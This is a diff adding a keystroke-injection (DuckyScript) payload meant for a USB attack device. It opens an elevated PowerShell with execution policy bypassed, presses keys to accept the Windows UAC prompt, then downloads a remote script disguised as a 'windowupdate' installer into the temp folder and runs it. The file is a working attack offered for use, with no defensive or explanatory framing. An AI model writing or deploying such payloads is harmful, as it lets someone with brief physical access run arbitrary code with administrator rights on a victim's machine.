@@ -1,0 +1,26 @@
+REM Title: Reliable Admin PowerShell Launch
+DELAY 15000
+REM 0. CLOSE WINDOWS EXPLORER (Alt+F4) 
+REM This closes the active window if one opened automatically
+ALT F4
+DELAY 1000
+
+REM 1. Open Run Box
+GUI r
+DELAY 500
+
+REM 2. Use the "Self-Elevate" Command
+REM This starts a hidden process that asks for Admin rights
+STRING powershell -NoP -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP','-Exec','Bypass'"
+ENTER
+DELAY 2500
+
+REM 3. Handle the UAC (Yes/No) popup
+REM This moves the focus to 'Yes' and presses Enter
+LEFT
+ENTER
+DELAY 2000
+
+REM 4. Now we are in an Admin window, download and run
+STRING $url = 'https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/download_install.ps1'; $p = "$env:temp\upd.ps1"; iwr $url -OutFile $p; powershell -File $p
+ENTER
